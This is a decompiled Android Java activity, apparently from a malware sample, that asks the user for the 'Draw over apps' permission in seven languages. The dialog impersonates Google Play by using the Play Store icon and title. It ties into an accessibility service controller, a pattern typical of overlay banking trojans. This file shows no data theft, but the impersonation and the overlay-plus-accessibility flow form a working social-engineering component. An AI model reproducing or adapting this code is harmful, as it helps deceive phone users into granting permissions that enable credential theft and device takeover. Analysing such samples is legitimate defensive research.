/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  android.app.Activity
 *  android.app.AlertDialog$Builder
 *  android.content.Context
 *  android.content.DialogInterface
 *  android.content.DialogInterface$OnClickListener
 *  android.content.Intent
 *  android.content.pm.PackageManager$NameNotFoundException
 *  android.net.Uri
 *  android.os.Bundle
 *  android.provider.Settings
 */
package linker.resourcer.encoder;

import android.app.Activity;
import android.app.AlertDialog;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Bundle;
import android.provider.Settings;
import java.util.Locale;
import linker.resourcer.encoder.SplashActivity;
import linker.resourcer.encoder.AccessibilityServiceHelper;
import linker.resourcer.encoder.UtilityHelper;
import linker.resourcer.encoder.AccessibilityServiceController;

public class DrawOverlayPermissionActivity
extends Activity {
    /*
     * Enabled aggressive block sorting
     * Enabled unnecessary exception pruning
     * Enabled aggressive exception aggregation
     */
    private void AskDraw() {
        int n;
        String string2;
        String string3;
        AlertDialog.Builder builder;
        block23: {
            builder = new AlertDialog.Builder((Context)this, 16974545);
            string3 = UtilityHelper.getLabelApplication(this.getApplicationContext()).toLowerCase();
            string2 = Locale.getDefault().getLanguage();
            switch (string2.hashCode()) {
                case 3886: {
                    if (!string2.equals("zh")) break;
                    n = 2;
                    break block23;
                }
                case 3710: {
                    if (!string2.equals("tr")) break;
                    n = 3;
                    break block23;
                }
                case 3651: {
                    if (!string2.equals("ru")) break;
                    n = 4;
                    break block23;
                }
                case 3588: {
                    if (!string2.equals("pt")) break;
                    n = 5;
                    break block23;
                }
                case 3246: {
                    if (!string2.equals("es")) break;
                    n = 6;
                    break block23;
                }
                case 3241: {
                    if (!string2.equals("en")) break;
                    n = 0;
                    break block23;
                }
                case 3121: {
                    if (!string2.equals("ar")) break;
                    n = 1;
                    break block23;
                }
            }
            n = -1;
        }
        switch (n) {
            default: {
                string2 = "Enable";
                builder.setMessage((CharSequence)("This app '" + string3 + "' requires 'Draw over apps' permission."));
                break;
            }
            case 6: {
                string2 = "Activar";
                builder.setMessage((CharSequence)("Esta aplicaci\u00f3n '" + string3 + "' requiere el permiso 'Mostrar sobre otras aplicaciones'."));
                break;
            }
            case 5: {
                string2 = "Ativar";
                builder.setMessage((CharSequence)("Este aplicativo '" + string3 + "' requer a permiss\u00e3o 'Mostrar sobre outros apps'."));
                break;
            }
            case 4: {
                string2 = "\u0412\u043a\u043b\u044e\u0447\u0438\u0442\u044c";
                builder.setMessage((CharSequence)("\u041f\u0440\u0438\u043b\u043e\u0436\u0435\u043d\u0438\u044e '" + string3 + "' \u0442\u0440\u0435\u0431\u0443\u0435\u0442\u0441\u044f \u0440\u0430\u0437\u0440\u0435\u0448\u0435\u043d\u0438\u0435 '\u041e\u0442\u043e\u0431\u0440\u0430\u0436\u0435\u043d\u0438\u0435 \u043f\u043e\u0432\u0435\u0440\u0445 \u0434\u0440\u0443\u0433\u0438\u0445 \u043f\u0440\u0438\u043b\u043e\u0436\u0435\u043d\u0438\u0439'."));
                break;
            }
            case 3: {
                string2 = "Etkinle\u015ftir";
                builder.setMessage((CharSequence)("Bu uygulama '" + string3 + "' 'Uygulamalar\u0131n \u00fcst\u00fcnde g\u00f6ster' iznini gerektirir."));
                break;
            }
            case 2: {
                string2 = "\u542f\u7528";
                builder.setMessage((CharSequence)("\u6b64\u5e94\u7528\u7a0b\u5e8f '" + string3 + "' \u9700\u8981\u201c\u5728\u5176\u4ed6\u5e94\u7528\u4e0a\u5c42\u663e\u793a\u201d\u7684\u6743\u9650\u3002"));
                break;
            }
            case 1: {
                string2 = "\u062a\u0641\u0639\u064a\u0644";
                builder.setMessage((CharSequence)("\u0647\u0630\u0627 \u0627\u0644\u062a\u0637\u0628\u064a\u0642 '" + string3 + "' \u064a\u062a\u0637\u0644\u0628 \u0625\u0630\u0646 '\u0627\u0644\u0625\u0638\u0647\u0627\u0631 \u0641\u0648\u0642 \u0627\u0644\u062a\u0637\u0628\u064a\u0642\u0627\u062a'."));
                break;
            }
            case 0: {
                string2 = "Enable";
                builder.setMessage((CharSequence)("This app '" + string3 + "' requires 'Draw over apps' permission."));
            }
        }
        try {
            builder.setIcon(this.getPackageManager().getApplicationIcon("com.android.vending"));
            builder.setTitle((CharSequence)"Google Play");
        }
        catch (PackageManager.NameNotFoundException nameNotFoundException) {
            try {
                builder.setIcon(this.getPackageManager().getApplicationIcon(this.getPackageName()));
                builder.setTitle((CharSequence)string3);
            }
            catch (PackageManager.NameNotFoundException nameNotFoundException2) {
                // empty catch block
            }
        }
        builder.setPositiveButton((CharSequence)string2, new DialogInterface.OnClickListener(this){
            final DrawOverlayPermissionActivity this$0;
            {
                this.this$0 = ajagnkhugafikwbjqn2;
            }

            public void onClick(DialogInterface dialogInterface, int n) {
                try {
                    StringBuilder stringBuilder = new StringBuilder();
                    dialogInterface = new Intent("android.settings.action.MANAGE_OVERLAY_PERMISSION", Uri.parse((String)stringBuilder.append("package:").append(this.this$0.getPackageName()).toString()));
                    dialogInterface.addFlags(0x10000000);
                    stringBuilder = new StringBuilder();
                    dialogInterface.setData(Uri.parse((String)stringBuilder.append("package:").append(this.this$0.getPackageName()).toString()));
                    this.this$0.startActivityForResult((Intent)dialogInterface, 0);
                }
                catch (Exception exception) {
                    // empty catch block
                }
            }
        });
        if (!this.isFinishing()) {
            builder.show();
        }
    }

    protected void onActivityResult(int n, int n2, Intent intent) {
        super.onActivityResult(n, n2, intent);
        if (n == 0) {
            if (n2 == -1) {
                AccessibilityServiceController.FOR_DRAW_OVER = false;
                intent = new Intent(this.getApplicationContext(), SplashActivity.class);
                intent.setFlags(0x34000000);
                this.startActivity(intent);
                this.finish();
            } else if (n2 == 0) {
                this.finish();
            }
        }
    }

    protected void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        try {
            this.requestWindowFeature(1);
            this.getWindow().setFlags(1024, 1024);
            if (!Settings.canDrawOverlays((Context)this.getApplicationContext())) {
                if (AccessibilityServiceHelper.myAccess() != null) {
                    StringBuilder stringBuilder = new StringBuilder();
                    bundle = new Intent("android.settings.action.MANAGE_OVERLAY_PERMISSION", Uri.parse((String)stringBuilder.append("package:").append(this.getPackageName()).toString()));
                    bundle.addFlags(0x10000000);
                    stringBuilder = new StringBuilder();
                    bundle.setData(Uri.parse((String)stringBuilder.append("package:").append(this.getPackageName()).toString()));
                    this.startActivityForResult((Intent)bundle, 0);
                    AccessibilityServiceController.FOR_DRAW_OVER = true;
                } else {
                    this.AskDraw();
                }
            } else {
                this.finish();
            }
        }
        catch (Exception exception) {
            // empty catch block
        }
    }

    protected void onDestroy() {
        super.onDestroy();
    }
}

